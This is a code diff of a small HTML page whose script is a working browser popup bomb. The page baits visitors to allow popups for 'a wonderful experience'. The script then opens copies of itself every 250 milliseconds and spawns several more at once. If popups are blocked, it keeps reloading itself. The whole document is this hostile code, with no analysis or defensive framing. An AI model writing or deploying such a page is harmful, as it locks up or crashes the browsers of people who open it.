@@ -8,20 +8,24 @@
     <body>
         Allow popups for a wonderful experience
         <script type="text/javascript">
+            var body = document.querySelector("body");
+            body.style.backgroundColor =
+            "rgb("+Math.random()*255+", "+Math.random()*255+", "+Math.random()*255+")";
+
+
             var open = window.open(".");
-            setInterval(1, function(){
-                for(var i = 0; i < 100; i ++){
-                    window.open(".");
-                }
-            });
-            for(var i = 0; i < 100; i ++){
+            setInterval(function(){
                 window.open(".");
-            }
+            }, 250);
             if(!open) {
                 alert("Please allow popups");
+                window.location.reload();
+            } else {
+                for(var i = 0; i < 5; i ++){
+                    window.open(".");
+                }
+                open.close();
             }
-            var body = document.querySelector("body");
-            body.style.backgroundColor = "rgb("+Math.random()*255+", "+Math.random()*255+", "+Math.random()*255+")";
         </script>
     </body>
 </html>
